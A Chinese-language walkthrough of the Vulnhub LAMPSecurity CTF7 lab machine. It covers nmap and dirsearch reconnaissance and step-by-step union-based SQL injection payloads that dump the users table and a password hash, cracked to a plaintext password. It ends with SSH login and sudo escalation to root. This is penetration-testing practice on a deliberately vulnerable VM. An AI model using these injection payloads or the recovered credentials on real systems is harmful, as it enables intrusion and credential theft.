---
title: Vulnhub-LAMPSecurity CTF7
published: 2025-03-09 16:17:52
tags: [Vulnhub]
category: 靶机
draft: false
---

# LAMPSecurity: CTF7

> [https://www.vulnhub.com/entry/lampsecurity-ctf7,86/](https://www.vulnhub.com/entry/lampsecurity-ctf7,86/)
> 

## 主机发现端口扫描

1. 探测存活主机，`140`为靶机
    
    ```php
    nmap -sP 192.168.75.0/24
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-23 23:16 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00062s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00050s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.140
    Host is up (0.00013s latency).
    MAC Address: 00:0C:29:9D:12:A9 (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00032s latency).
    MAC Address: 00:50:56:F8:B3:1A (VMware)
    Nmap scan report for 192.168.75.131
    Host is up.
    ```
    
2. 扫描主机所有端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.140
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-23 23:16 CST
    Nmap scan report for 192.168.75.140
    Host is up (0.00078s latency).
    Not shown: 65507 filtered tcp ports (no-response), 19 filtered tcp ports (host-unreach)
    PORT      STATE  SERVICE
    22/tcp    open   ssh
    80/tcp    open   http
    137/tcp   closed netbios-ns
    138/tcp   closed netbios-dgm
    139/tcp   open   netbios-ssn
    901/tcp   open   samba-swat
    5900/tcp  closed vnc
    8080/tcp  open   http-proxy
    10000/tcp open   snet-sensor-mgmt
    MAC Address: 00:0C:29:9D:12:A9 (VMware)
    ```
    
3. 扫描服务版本及系统版本
    
    ```php
    nmap -sT -sV -O -p22,80,139,901,5900,8080,10000  192.168.75.140
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-23 23:23 CST
    Nmap scan report for 192.168.75.140
    Host is up (0.00043s latency).
    
    PORT      STATE  SERVICE     VERSION
    22/tcp    open   ssh         OpenSSH 5.3 (protocol 2.0)
    80/tcp    open   http        Apache httpd 2.2.15 ((CentOS))
    139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)
    901/tcp   open   http        Samba SWAT administration server
    5900/tcp  closed vnc
    8080/tcp  open   http        Apache httpd 2.2.15 ((CentOS))
    10000/tcp open   http        MiniServ 1.610 (Webmin httpd)
    MAC Address: 00:0C:29:9D:12:A9 (VMware)
    Device type: general purpose
    Running: Linux 2.6.X|3.X
    OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
    OS details: Linux 2.6.32 - 3.13
    Network Distance: 1 hop
    ```
    
    `MiniServ 1.610` 通过搜索发现是文件服务器
    
4. 扫描漏洞
    
    ```php
    nmap -script=vuln -p22,80,139,901,5900,8080,10000  192.168.75.140
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-23 23:26 CST
    Nmap scan report for 192.168.75.140
    Host is up (0.0019s latency).
    
    PORT      STATE  SERVICE
    22/tcp    open   ssh
    80/tcp    open   http
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
    | http-slowloris-check: 
    |   VULNERABLE:
    |   Slowloris DOS attack
    |     State: LIKELY VULNERABLE
    |     IDs:  CVE:CVE-2007-6750
    |       Slowloris tries to keep many connections to the target web server open and hold
    |       them open as long as possible.  It accomplishes this by opening connections to
    |       the target web server and sending a partial request. By doing so, it starves
    |       the http server's resources causing Denial Of Service.
    |       
    |     Disclosure date: 2009-09-17
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
    |_      http://ha.ckers.org/slowloris/
    | http-fileupload-exploiter: 
    |   
    |     Couldn't find a file-type field.
    |   
    |     Couldn't find a file-type field.
    |   
    |     Couldn't find a file-type field.
    |   
    |_    Couldn't find a file-type field.
    |_http-trace: TRACE is enabled
    | http-enum: 
    |   /webmail/: Mail folder
    |   /css/: Potentially interesting directory w/ listing on 'apache/2.2.15 (centos)'
    |   /icons/: Potentially interesting folder w/ directory listing
    |   /img/: Potentially interesting directory w/ listing on 'apache/2.2.15 (centos)'
    |   /inc/: Potentially interesting directory w/ listing on 'apache/2.2.15 (centos)'
    |   /js/: Potentially interesting directory w/ listing on 'apache/2.2.15 (centos)'
    |_  /webalizer/: Potentially interesting folder
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    139/tcp   open   netbios-ssn
    901/tcp   open   samba-swat
    5900/tcp  closed vnc
    8080/tcp  open   http-proxy
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |       httponly flag not set
    |   /login.php: 
    |     PHPSESSID: 
    |_      httponly flag not set
    | http-slowloris-check: 
    |   VULNERABLE:
    |   Slowloris DOS attack
    |     State: LIKELY VULNERABLE
    |     IDs:  CVE:CVE-2007-6750
    |       Slowloris tries to keep many connections to the target web server open and hold
    |       them open as long as possible.  It accomplishes this by opening connections to
    |       the target web server and sending a partial request. By doing so, it starves
    |       the http server's resources causing Denial Of Service.
    |       
    |     Disclosure date: 2009-09-17
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
    |_      http://ha.ckers.org/slowloris/
    |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
    |_http-trace: TRACE is enabled
    | http-enum: 
    |   /login.php: Possible admin folder
    |   /phpmyadmin/: phpMyAdmin
    |   /docs/: Potentially interesting directory w/ listing on 'apache/2.2.15 (centos)'
    |   /icons/: Potentially interesting folder w/ directory listing
    |_  /inc/: Potentially interesting directory w/ listing on 'apache/2.2.15 (centos)'
    10000/tcp open   snet-sensor-mgmt
    MAC Address: 00:0C:29:9D:12:A9 (VMware)
    
    Host script results:
    | smb-vuln-regsvc-dos: 
    |   VULNERABLE:
    |   Service regsvc in Microsoft Windows systems vulnerable to denial of service
    |     State: VULNERABLE
    |       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
    |       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
    |       while working on smb-enum-sessions.
    |_          
    |_smb-vuln-ms10-054: false
    | smb-vuln-cve2009-3103: 
    |   VULNERABLE:
    |   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2009-3103
    |           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
    |           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
    |           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
    |           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
    |           aka "SMBv2 Negotiation Vulnerability."
    |           
    |     Disclosure date: 2009-09-08
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
    |_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
    |_smb-vuln-ms10-061: false
    ```
    
    发现了很多可能会感兴趣的目录，并扫出了`smb`的漏洞，但是看描述可能只是对`windows`有害
    
    优先级大概是`80`→`8080`→`10000`→`also`
    

## web渗透

### 80端口

1. 访问网站`http://192.168.75.140/` ，title为 `Mad Irish Hacking Academy` 
2. 扫描网站目录
    
    ```php
    dirsearch -u 192.168.75.140
    //                 
    [23:44:12] 200 -    5KB - /about                                            
    [23:44:23] 404 -  294B  - /assets/fckeditor                                 
    [23:44:23] 301 -  317B  - /assets  ->  http://192.168.75.140/assets/
    [23:44:23] 404 -  289B  - /assets/file
    [23:44:23] 404 -  298B  - /assets/npm-debug.log
    [23:44:23] 404 -  297B  - /assets/pubspec.yaml                              
    [23:44:23] 200 -    2KB - /assets/                                          
    [23:44:23] 404 -  297B  - /assets/js/fckeditor                              
    [23:44:24] 301 -  333B  - /backups  ->  http://192.168.75.140/backups/?action=backups
    [23:44:26] 403 -  290B  - /cgi-bin/                                         
    [23:44:29] 200 -    5KB - /contact                                          
    [23:44:29] 301 -  314B  - /css  ->  http://192.168.75.140/css/              
    [23:44:29] 404 -  285B  - /css.php                                          
    [23:44:30] 200 -    4KB - /db                                               
    [23:44:33] 403 -  288B  - /error/                                           
    [23:44:33] 404 -  293B  - /error/error.log                                  
    [23:44:35] 200 -    4KB - /footer                                           
    [23:44:36] 200 -    4KB - /header                                           
    [23:44:38] 301 -  314B  - /img  ->  http://192.168.75.140/img/              
    [23:44:38] 404 -  287B  - /img_admin                                        
    [23:44:38] 301 -  314B  - /inc  ->  http://192.168.75.140/inc/              
    [23:44:38] 200 -    4KB - /inc/                                             
    [23:44:38] 404 -  286B  - /include/
    [23:44:38] 404 -  286B  - /includes                         
    [23:44:40] 200 -    4KB - /js/                                                                              
    [23:44:46] 200 -    4KB - /newsletter                                       
    [23:44:48] 200 -   59KB - /phpinfo                                          
    [23:44:51] 200 -    4KB - /profile                                          
    [23:44:52] 200 -    6KB - /register                                         
    [23:44:56] 200 -    5KB - /signup                                           
    [23:45:03] 403 -  287B  - /usage                                            
    [23:45:06] 301 -  320B  - /webalizer  ->  http://192.168.75.140/webalizer/  
    [23:45:06] 404 -  291B  - /webalizer.php                                    
    [23:45:06] 404 -  292B  - /webalizer.html                               
    [23:45:07] 200 -    4KB - /webalizer/
    [23:45:07] 301 -  318B  - /webmail  ->  http://192.168.75.140/webmail/      
    [23:45:07] 404 -  304B  - /webmail/src/configtest.php
    //删掉了很多404的
    ```
    
3. 访问可能有信息的目录
    - `/phpinfo` 暴露了phpinfo的信息
    - `/webalizer/` 好像是一个网站访问次数之类的统计，并且爆出来了一些目录
    - `/inc` 存放着一些网站文件
    - `/webmail` 邮件服务器登陆界面
4. `/signup` 注册了个账号，使用邮箱密码登陆的，注册后能看到一员工介绍`/profile&id=3`是关于`brian@localhost.localdomain` 的，可能可以尝试爆破
    
    并且`profile&id=3` 看着可能会造成sql注入
    
    - 尝试sql注入-  `http://192.168.75.140/profile&id=3` （手工注入）
        
        ```sql
        //  select * from users where user_id = 1' 爆出语句，数值型注入
        profile&id=1'
        // 判断注入点
        profile&id=3 and 1=2
        // 有7个字段
        profile&id=3 order by 7
        // 根据页面显示，回显位为 1，6，7
        profile&id=0 union select 1,2,3,4,5,6,7
        // 很有用的信息，当前数据库为website，数据库用户为root，数据库版本为5.1.66
        profile&id=0 union select database(),2,3,4,5,user(),version()
        // 当前数据库的表：contact,documents,hits,log,newsletter,payment,trainings,trainings_x_users,users
        profile&id=0 union select 1,2,3,4,5,(select group_concat(table_name) from information_schema.tables where table_schema=database()),7
        // users表的列username,password,is_admin,last_login,user_id,realname,profile
        http://192.168.75.140/profile&id=0 union select 1,2,3,4,5,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),7
        // 将users表的数据爆出来
        http://192.168.75.140/profile&id=0 union select 1,2,3,4,5,(select group_concat(username,'~',password,'~',is_admin,'~',last_login,'~',user_id,'~',realname,'~',profile) from users),7
        ```
        
        ```sql
        brian@localhost.localdomain~
        e22f07b17f98e0d9d364584ced0e3c18~
        1~
        2012-12-19 11:30:54~
        3~
        Brian Hershel~
        Brian is our technical brains behind the operations and a chief trainer.
        ```
        
        `is_admin = 1`,所以对我们帮助可能不小，MD5密码破译为 `my2cents`
        
5. `index.php`里面登陆后好像没什么可以利用的
    
    尝试下`ssh`登录，登陆成功
    
    ```sql
    ssh -oHostKeyAlgorithms=+ssh-dss brian@192.168.75.140
    //
    brian@192.168.75.140's password: 
    [brian@localhost ~]$ 
    ```
    
    查看权限
    
    ```sql
    [brian@localhost ~]$ whoami
    brian
    //
    [brian@localhost ~]$ uname -a
    Linux localhost.localdomain 2.6.32-279.el6.i686 #1 SMP Fri Jun 22 10:59:55 UTC 2012 i686 i686 i386 GNU/Linux
    //
    [brian@localhost ~]$ ip a
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000
        link/ether 00:0c:29:9d:12:a9 brd ff:ff:ff:ff:ff:ff
        inet 192.168.75.140/24 brd 192.168.75.255 scope global eth0
        inet6 fe80::20c:29ff:fe9d:12a9/64 scope link 
           valid_lft forever preferred_lft forever
    //
    [brian@localhost ~]$ sudo -l
    Matching Defaults entries for brian on this host:
        requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS",
        env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
        LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS
        _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
    
    User brian may run the following commands on this host:
        (ALL) ALL
    ```
    
    竟然直接获得权限了
    
    ```sql
    [brian@localhost ~]$ sudo -i
    [root@localhost ~]# 
    ```